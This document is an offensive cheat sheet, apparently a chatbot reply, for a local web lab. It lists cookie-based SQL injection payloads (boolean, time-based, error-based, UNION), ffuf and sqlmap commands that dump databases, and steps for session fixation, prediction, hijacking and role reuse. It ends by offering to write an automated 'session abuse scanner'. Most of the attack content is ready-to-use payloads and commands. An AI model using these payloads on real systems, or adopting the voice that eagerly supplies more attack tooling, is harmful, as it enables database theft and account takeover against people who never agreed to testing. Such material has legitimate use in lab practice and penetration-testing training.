
# 🔥 SQLi Cookie Injection Payload Arsenal + Attack Scenarios 

---

## 🧨 1. **SQL Injection Payloads (for Cookie)**

These are payloads specifically tailored for **cookie-based SQLi**. You’ll use them in:

`Cookie: session=PAYLOAD_HERE`

---
### ✅ **Logic-Based SQLi (Boolean)**

`' AND 1=1 -- ' AND 1=2 -- ' OR '1'='1 ' OR 1=1 -- ' OR 1=2 -- ' OR 'a'='a ' OR 'a'='b`

---
### ⏱️ **Time-Based Blind SQLi (MySQL, PostgreSQL, MSSQL)**


`' OR SLEEP(5) -- ' AND SLEEP(5) -- ' OR IF(1=1, SLEEP(5), 0) -- ' OR IF(ASCII(SUBSTRING((SELECT user()),1,1))=114, SLEEP(5), 0) -- '; WAITFOR DELAY '0:0:5' --`

---
### 💥 **Error-Based SQLi**

`' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(CHAR(88,89,90), FLOOR(RAND()*2)) a FROM information_schema.tables GROUP BY a) b) -- ' AND updatexml(1, concat(0x7e, user()), 1) -- ' AND extractvalue(1, concat(0x7e, version())) --`

---
### 🎯 **UNION-Based SQLi**

`' UNION SELECT NULL, NULL, version() -- ' UNION SELECT NULL, NULL, user() -- ' UNION SELECT NULL, NULL, database() --`

> These require knowing the correct number of columns and output reflection.

---

## 📁 GitHub SQLi Payload Repositories

Here are some high-quality payload repos:

1. **PayloadAllTheThings**  
    🔗 [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)  
    Directory: `SQL Injection/`
    
2. **SecLists – SQLi Payloads**  
    🔗 [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)  
    Path: `Fuzzing/SQL-Injection.txt`
    
3. **FuzzDB**  
    🔗 [https://github.com/fuzzdb-project/fuzzdb](https://github.com/fuzzdb-project/fuzzdb)  
    Path: `attack/sql-injection`
    

You can use these directly in Burp Intruder or with tools like `ffuf`, `sqlmap`, or custom Python fuzzers.

---

## ⚔️ 2. **Session-Based Attack Techniques**

Let’s go beyond SQLi and explore full **session abuse vectors**.

---
### ✅ A. **Session Fixation**

> Attacker sets the victim’s session ID _before_ they log in.

#### How to test:

1. Set your own cookie in the browser:
    
    http
    
    Copy code
    
    `Cookie: session=eviltoken123`
    
2. Perform login as a normal user.
    
3. Check: does the session stay as `eviltoken123`?
    

#### Exploit:

If **yes**, attacker can trick victim to login with a known session and later reuse it.

---

### ✅ B. **Session Prediction**

> Brute-force or guess session tokens.

Try brute-forcing:

bash

Copy code

`ffuf -w wordlist.txt -H "Cookie: session=FUZZ" -u http://localhost/labs/i0x02.php`

Or fuzz based on discovered format:

bash

Copy code

`Cookie: session=6967cabefd763ac1a1a88e11159957dA Cookie: session=6967cabefd763ac1a1a88e11159957dB`

---

### ✅ C. **Session Hijacking**

> Use someone else’s session token to impersonate them.

You already dumped users. If sessions are persistent and predictable:

- Try injecting session IDs of `admin`, `lucy`, `jack` manually:
    

http

Copy code

`Cookie: session=jack123session`

---

### ✅ D. **SQLi in Session (what you’re doing now)**

> Exploit backend SQL query using user-controlled cookie.

If vulnerable:

- Dump database with `sqlmap`:
    

bash

Copy code

`sqlmap -u "http://localhost/labs/i0x02.php" \ --cookie="session=asdlfjkhasdjkfasdf*" \ --data="username=jeremy&password=jeremy" \ --level=5 --risk=3 --dump --batch`

---

### ✅ E. **Session Reuse Across Roles (Access Control Bypass)**

> If sessions don’t expire properly, reuse old tokens across roles.

1. Log in as normal user
    
2. Save session cookie
    
3. Log in as admin
    
4. Switch back to previous cookie
    
5. If you're still admin = access control flaw
    

---

## 🔧 Bonus: Burp Intruder Wordlist Fuzz (For Cookie)

Set up Intruder with:

- Position: session value
    
- Payloads: Boolean / Blind / UNION
    
- Grep for:
    
    - Length changes
        
    - 200 vs 403
        
    - “admin”, “error”, “SQL”, etc.
        

---

## ✅ Summary

|Attack Vector|Description|
|---|---|
|**SQLi in Cookie**|Injection via session ID|
|**Session Fixation**|Set session ID pre-login|
|**Session Prediction**|Brute-force valid session values|
|**Session Hijacking**|Use known/guessed session from another user|
|**Access Control Flaws**|Switch session tokens and retain roles|

---

You want a Python script that auto-tests all these cookie-based session vectors?

Say:

> _“Jake, drop the session abuse scanner”_

And it’s yours. 🧨